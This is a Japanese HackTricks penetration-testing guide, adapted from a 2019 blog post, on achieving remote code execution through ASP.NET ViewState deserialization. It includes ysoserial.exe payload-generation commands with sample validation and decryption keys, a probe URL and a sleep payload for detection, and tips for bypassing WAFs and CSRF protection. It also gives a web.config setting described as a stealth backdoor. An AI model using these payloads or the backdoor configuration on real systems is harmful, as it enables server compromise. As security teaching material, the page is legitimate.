<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業**で働いていますか？ **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォロー**してください。

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)にPRを提出**してください。

</details>


**この投稿の内容は**[**https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/**](https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/) **から抽出されました**

# はじめに

ASP.NETのWebアプリケーションでは、ViewStateを使用してページの状態を維持し、Webフォームでデータを永続化します。

通常、有効なViewStateを偽造するために、Webサーバー上でコードを実行することが可能です。これは、**MAC検証**機能が**無効化**されている場合や、以下の情報を知っている場合に行うことができます。

* **.NET Frameworkバージョン4.5より前の場合、検証キーとそのアルゴリズム**を**事前に**知っている場合
* **.NET Frameworkバージョン4.5以降の場合、検証キー、検証アルゴリズム、復号キー、および復号アルゴリズム**を知っている場合

操作の改ざん攻撃を防ぐために、.NET Frameworkは、`LosFormatter`クラスを使用してシリアル化されたViewStateを**署名と暗号化**することができます。その後、メッセージ認証コード（MAC）検証メカニズムを使用して署名を検証します。`ObjectStateFormatter`クラスは、署名、暗号化、および検証のタスクを実行します。署名および/または暗号化メカニズムを実行するために必要な**キー**は、ASP.NETアプリケーションの**`web.config`**（アプリケーションレベル）または**`machine.config`**（マシンレベル）ファイルの`machineKey`セクションに格納されることが通常です。これは、ウェブファームまたはクラスタ内のロードバランサの背後で同じアプリケーションを提供するために複数のウェブサーバーが使用される場合に一般的です。以下は、.NET Frameworkバージョン2.0以降を使用するASP.NETアプリケーションの設定ファイルの`machineKey`セクションの形式を示しています。
```markup
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto | DES | 3DES | AES | alg:algorithm_name]" />
<machineKey validationKey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" decryptionKey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" validation="SHA1" decryption="AES"  />
```
# RCEを無効化したViewState MAC検証

過去には、`enableViewStateMac`プロパティを`False`に設定するだけで、MAC検証を無効化することができました。Microsoftは2014年9月にパッチをリリースし、.NET Frameworkのすべてのバージョンでこのプロパティを無視してMAC検証を強制するようにしました。一部の人々は「_ViewState MACはもはや無効化できない_」と信じているかもしれませんが、`AspNetEnforceViewStateMac`レジストリキーをゼロに設定することで、MAC検証機能を無効化することができます。設定場所は以下の通りです：
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\.NETFramework\v{VersionHere}
```
代わりに、次の**危険な設定**をアプリケーションレベルの`web.config`ファイルに追加すると、MAC検証を無効にすることもできます:
```markup
<configuration>
…
<appSettings>
<add key="aspnet:AllowInsecureDeserialization" value="true" />
</appSettings>
</configuration>
```
{% hint style="danger" %}
ViewState MAC検証が**無効化**されている場合、[YSoSerial.Net](https://github.com/pwntester/ysoserial.net)プロジェクトを使用して、`LosFormatter`ペイロードをViewStateとして生成し、サーバー上で任意のコードを実行することができます。
{% endhint %}

**.NET Frameworkバージョン4.5より前**では、`__VIEWSTATE`パラメータは**MAC検証機能が無効化されている間に暗号化される**ことがありました。ほとんどの**スキャナー**は、この脆弱性を特定するために暗号化されていないViewStateパラメータを送信しようとはしません。そのため、`__VIEWSTATE`パラメータが暗号化されている場合にMAC検証が無効化されているかどうかを確認するためには、**手動のテスト**が必要です。これは、`__VIEWSTATE`パラメータに短いランダムなBase64文字列を送信することで確認できます。以下のURLは例を示しています：
```
https://victim.com/path/page.aspx?__VIEWSTATE=AAAA
```
もしターゲットのページがエラーで応答する場合、MAC検証機能は無効になっています。そうでなければ、MAC検証エラーメッセージは抑制されているはずです。\
ただし、エラーメッセージが見えない場合には、このトリックは機能しません。

自動化スキャナーは、サーバーサイドで短い遅延を引き起こすペイロードを使用する必要があります。以下のASP.NETコードを実行することで、10秒の遅延を作成する例です。
```
System.Threading.Thread.Sleep(10000);
```

```bash
string xaml_payload = @"<ResourceDictionary
xmlns=""http://schemas.microsoft.com/winfx/2006/xaml/presentation""
xmlns:x=""http://schemas.microsoft.com/winfx/2006/xaml""
xmlns:System=""clr-namespace:System;assembly=mscorlib""
xmlns:Thr=""clr-namespace:System.Threading;assembly=mscorlib"">
<ObjectDataProvider x:Key=""x"" ObjectType = ""{ x:Type Thr:Thread}"" MethodName = ""Sleep"" >
<ObjectDataProvider.MethodParameters>
<System:Int32>10000</System:Int32>
</ObjectDataProvider.MethodParameters>
</ObjectDataProvider>
</ResourceDictionary>";
```
# 有効なViewState MAC検証でのRCE

古いバージョン（**4.5より前**）の.NET Frameworkでは、シリアライズされたオブジェクトに署名する際に、**`TemplateSourceDirectory`**プロパティ[\[15\]](https://docs.microsoft.com/en-us/dotnet/api/system.web.ui.control.templatesourcedirectory)が使用されます。しかし、バージョン**4.5以降**では、ハッシュを作成するために**`Purpose`**文字列が使用されます。これらのメカニズムは、**アプリケーションディレクトリのルートからのターゲットパス**と**ページ名**が必要です。これらのパラメータは、**URLから抽出**することができます。

古いフレームワークを使用し、ViewStateの暗号化を強制するアプリケーションは、**暗号化されていない署名付きViewStateを受け入れることができます**。つまり、**検証キーとそのアルゴリズムを知っているだけで、ウェブサイトを攻撃することができます**。最新の.NET Frameworkバージョンでは、`viewStateEncryptionMode`プロパティが`Never`に設定されていても、ViewStateはデフォルトで暗号化されるようです。したがって、最新の.NET Frameworkバージョンでは、ペイロードを作成するためには**復号化キーとそのアルゴリズムも必要です**。

ASP.NET ViewStateには、`ViewStateUserKey`というプロパティがあります[\[16\]](https://docs.microsoft.com/en-us/previous-versions/dotnet/articles/ms972969\(v=msdn.10\))。これは、クロスサイトリクエストフォージェリ（CSRF）攻撃のリスクを軽減するために使用できます[\[4\]](https://www.owasp.org/index.php/Anti\_CSRF\_Tokens\_ASP.NET)。**`ViewStateUserKey`**プロパティの値（`null`でない場合）は、ViewStateの署名プロセス中にも使用されます。このパラメータの値を知らないと攻撃を止めることができますが、**その値はクッキーや非表示の入力パラメータによってしばしば見つかることがあります**（\[17\]](https://software-security.sans.org/developer-how-to/developer-guide-csrf)に実装例が示されています）。

## ViewState YSoSerial.Netプラグイン

YSoSerial.NetのマスターとYSoSerial.Netv2では、すべての情報がわかっている場合にこのテクニックを悪用するためのプラグイン（[**こちら**](https://github.com/pwntester/ysoserial.net/blob/master/ysoserial/Plugins/ViewStatePlugin.cs)と[**こちら**](https://github.com/pwntester/ysoserial.net/blob/v2/ysoserial/Plugins/ViewStatePlugin.cs)）が見つかります。

### **.NET Framework >= 4.5の場合:**
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
### **.NET Framework <= 4.0（レガシー）の場合：**

_ここでは、復号キーとそのアルゴリズムは必要ありません:_
```bash
.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
```
_異なるガジェットを使用する以外にも、パスを提供する代わりに`__VIEWSTATEGENERATOR`パラメータを使用することも可能です:_
```bash
.\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --generator=93D20A1B --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
_デフォルトでは、ActivitySurrogateSelectorガジェットが使用されます。これには、YSoSerial.NetプロジェクトのExploitClass.csクラスをコンパイルする必要があります。ViewStateのペイロードは、**復号キーの値がわかっている場合にWAFを回避するために** **暗号化**されることもあります:_
```bash
.\ysoserial.exe -p ViewState -c "foo to use ActivitySurrogateSelector" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --islegacy --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --isencrypted --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
```
{% hint style="info" %}
**注意:** YSoSerial.Netで使用されるガジェットの性質上、エクスプロイトがサーバーサイドで正常に実行された場合でも、対象のASP.NETページは常にエラーで応答します。
{% endhint %}

### アプリケーションパス

有効なViewStateを作成するためには、次の条件が必要です。

* アプリケーションが.NET Frameworkバージョン4.0以下を使用していること
* `__VIEWSTATEGENERATOR`パラメータが既知であること

以下のスクリーンショットは、IISでのパスツリーを示しています。

![](https://soroush.secproject.com/downloadable/images/aspnetviewstate/iis.png)

IISでの仮想ディレクトリとアプリケーションの用語に馴染みがない場合は、[\[20\]](https://docs.microsoft.com/en-us/iis/get-started/planning-your-iis-architecture/understanding-sites-applications-and-virtual-directories-on-iis)を参照してください。

上記のURLに対してViewStateを生成するために、`--path`と`--apppath`引数は以下のようにする必要があります：
```
--path=/dir1/vDir1/dir2/app1/dir3/app2/vDir2/dir4
--apppath=/app2/
```
もし私たちが「app2」がアプリケーション名であることを知らなかった場合、DNSリクエストを取得したり遅延を引き起こしたりすることで、サーバ上でコードを実行できるViewStateを見つけるまで、URLのディレクトリ名を一つずつ試行錯誤することができます。

### ジェネレータ

この場合、`--generator`引数を使用することができます。`--path`と`--apppath`引数が指定された場合、プラグインが同じ`__VIEWSTATEGENERATOR`パラメータを計算するかどうかを確認するために、`--isdebug`引数を使用することもできます。

## 古いバージョンの悪用

.NET Framework v1.1を悪用するためのガジェットは、このブログ投稿の執筆時点では特定されませんでした。

.NET Framework v4.0以下を使用するアプリケーションを悪用するためには、YSoSerial.Net v2.0ブランチ[\[21\]](https://github.com/nccgroup/VulnerableDotNetHTTPRemoting/tree/master/ysoserial.net-v2)を使用することができます（これは元々別の研究の一環として開発されました[\[22\]](https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2019/march/finding-and-exploiting-.net-remoting-over-http-using-deserialisation/)）。ただし、このプロジェクトは一部のガジェットのみをサポートしており、対象のボックスには.NET Framework 3.5以上がインストールされている必要もあります。

## **その他のツール**

Immunity Canvasは、検証および暗号化キーが既知の場合にViewStateパラメータを作成することができるようです[\[29\]](https://vimeopro.com/user18478112/canvas/video/260982761)。以下のツールは、私が自分の作業を公開しようとしていたときに偶然リリースされたもので、非常に驚きました。

* [https://github.com/0xACB/viewgen](https://github.com/0xACB/viewgen)（Pythonで書かれています）
* [https://github.com/Illuminopi/RCEvil.NET](https://github.com/Illuminopi/RCEvil.NET)（.NETで書かれています）

これらのツールは現在、.NET Frameworkの異なるバージョンを区別せず、レガシーの暗号化を対象としているようです。また、CSRF攻撃を防止するために使用される可能性のある`ViewStateUserKey`パラメータを使用していません。

# 追加のヒント

## **GETリクエストの使用**

`__VIEWSTATE`パラメータをGETリクエストのURLに含めることも可能です。制限要因はURLの長さであり、ここでは使用できるガジェットの種類が制限されます。

## **.NET Frameworkバージョン4.5以前の暗号化**

前述のように、.NET Framework 4.0およびそれ以下（v2.0からv4.0でテスト済み）を悪用する場合、`__VIEWSTATE`パラメータは暗号化する必要はありません。これは、`ViewStateEncryptionMode`プロパティが`Always`に設定されている場合でもです。ASP.NETは、リクエスト中の`__VIEWSTATEENCRYPTED`パラメータを見つけることで、ViewStateが暗号化されているかどうかを判断します（値を持つ必要はありません）。したがって、リクエストから`__VIEWSTATEENCRYPTED`パラメータを削除することで、暗号化されていないViewStateを送信することが可能です。

これは、検証キーとそのアルゴリズムが盗まれた場合、復号キーまたはそのアルゴリズムを変更しても攻撃を止めることはできないことを意味します。

ただし、WAFをバイパスするために`__VIEWSTATE`パラメータを暗号化することも可能です。

## **CSRF（XSRF）防止メカニズムのバイパス**

無効な`__VIEWSTATE`パラメータが使用された場合、ASP.NETページはエラーを生成します。ただし、`Request.Form`を直接コード内で使用する場合、ページはまだ入力を受け取ることができます。たとえば、以下のようなサーバサイドのコードで`Request.Form["txtMyInput"]`を使用することで、CSRF攻撃を実行することができます。`txtMyInput.Text`ではなく。

CSRF攻撃は、リクエストから`__VIEWSTATE`パラメータを削除するか、`__PREVIOUSPAGE`パラメータに無効な値を追加することによって達成することができます。`__PREVIOUSPAGE`パラメータはデフォルトで暗号化され、base64形式になっているため、値として単一の文字を提供するだけでもエラーが発生するはずです。

これにより、`Page.ViewStateUserKey`パラメータを設定して実装されたCSRF保護メカニズムをバイパスする可能性があります。

## **ViewStateGeneratorパラメータの使用**

`__VIEWSTATEGENERATOR`パラメータが既知の場合、アプリケーションパスを知らなくても.NET Frameworkバージョン4.0以下を使用するASP.NETアプリケーションでシリアライズされたオブジェクトに署名するために使用することができます。

## **WAFをバイパスするためのViewStateの分割**

`MaxPageStateFieldLength`プロパティが**正の値**に設定されている場合、`__VIEWSTATE`パラメータを複数の部分に分割することが可能です。デフォルト値は**負の値**であり、これは**`__VIEWSTATE`パラメータを複数の部分に分割することはできない**ことを意味します。

ViewStateの分割が許可されている場合、一部のWAFをバイパスするのに役立つ場合があります。

## **EventValidationパラメータの悪用**

`__EVENTVALIDATION`パラメータといくつかの他のパラメータも、`__VIEWSTATE`パラメータと同様にシリアライズされ、同様に対象となる可能性があります。`__EVENTVALIDATION`を介したデシリアライゼーションの問題を悪用するには、次の条件が必要です。

* POSTリクエスト
* 入力パラメータを受け入れるASP.NETページ
* 有効な入力パラメータ名。たとえば、以下のようなサーバサイドのコードがある場合、POSTリクエストの`myinput`パラメータです。
```markup
<asp:TextBox runat="server" ID="myinput" />
```
`__VIEWSTATE`パラメータの値は、`__EVENTVALIDATION`パラメータを悪用する際には空であってもリクエストに存在する必要があります。

.NET Framework 4.5以降で使用される`Purpose`文字列は、使用されるパラメータに基づいて異なります。以下の表は、.NET Frameworkで定義された`Purpose`文字列を示しています。

| **入力パラメータ**                                            | **Purpose文字列**                                  |
| ------------------------------------------------------------ | -------------------------------------------------- |
| “\_\_VIEWSTATE”                                              | WebForms.HiddenFieldPageStatePersister.ClientState |
| “\_\_EVENTVALIDATION”                                        | WebForms.ClientScriptManager.EventValidation       |
| P1中のP2\|P1中のP2 in “\_\_dv” + ClientID + “\_\_hidden”      | WebForms.DetailsView.KeyTable                      |
| P1中のP2\|P3\|P4\|P1中のP2\|P3\|P4 in “\_\_CALLBACKPARAM”     | WebForms.DetailsView.KeyTable                      |
| P1中のP2\|P3\|P4\|P1中のP2\|P3\|P4 in “\_\_gv” + ClientID + “\_\_hidden” | WebForms.GridView.SortExpression                   |
| P1中のP2\|P3\|P4\|P1中のP2\|P3\|P4 in “\_\_gv” + ClientID + “\_\_hidden” | WebForms.GridView.DataKeys                         |

上記の表は、対象となる可能性のあるすべての入力パラメータを示しています。

## **PreviousPageパラメータに注意**

リクエストに**`__PREVIOUSPAGE`**パラメータが**無効な**データで存在する場合、**アプリケーション**は**`__VIEWSTATE`**パラメータをデシリアライズしません。`__CALLBACKID`パラメータを提供することで、この動作を防ぐことができます。

## **エラーの信頼性**

前述のように、有効なViewStateが生成されたかどうかを確認するために、エラーを使用することがあります。ASP.NETは、無効な`__VIEWSTATEGENERATOR`パラメータが使用された場合、MAC検証エラーをデフォルトで表示しません。ただし、`ViewStateUserKey`プロパティが使用されると、ASP.NETはMAC検証エラーを抑制しなくなります。

さらに、ASP.NET Webアプリケーションは、`ViewStateUserKey`プロパティが使用されている場合でも、以下の設定でMAC検証エラーを無視することができます。
```markup
<appSettings>
<add key="aspnet:AlwaysIgnoreViewStateValidationErrors" value="true" />
</appSettings>
```
# Web.configをバックドアとして使用する

攻撃者がアプリケーションのルートにある**`web.config`**を**変更**できる場合、彼らはサーバー上で簡単にコードを実行できます。しかし、攻撃者にとっては、アプリケーションにステルスバックドアを埋め込むことが良い選択肢となるかもしれません。これは、**MAC検証を無効にし、`viewStateEncryptionMode`プロパティを`Always`に設定する**ことで実現できます。これにより、`ViewStateEncryptionMode`プロパティを`Auto`または`Never`に設定しないすべてのASP.NETページは常に暗号化されたViewStateパラメータを使用します。しかし、**ViewStateはMAC検証機能を使用しないため、信頼できないデータの逆シリアル化によるリモートコード実行の脆弱性が生じます**。以下に例を示します：
```markup
<configuration>
…
<system.web>
…
<pages enableViewStateMac="false" viewStateEncryptionMode="Always" />
</system.web>
<appSettings>
<add key="aspnet:AllowInsecureDeserialization" value="false" />
</appSettings>
</configuration>
```
別のオプションとして、任意のキーとアルゴリズムを使用して`machineKey`セクションを設定し、他の攻撃者を防ぐことができます！

`EnableViewState`プロパティを`False`に設定しても、ViewStateはASP.NETによって解析されるため、この攻撃を防ぐことはできません。

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！

- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。

- [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう。

- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktricks)と[hacktricks-cloudリポジトリ](https://github.com/carlospolop/hacktricks-cloud)**にPRを提出してください。

</details>
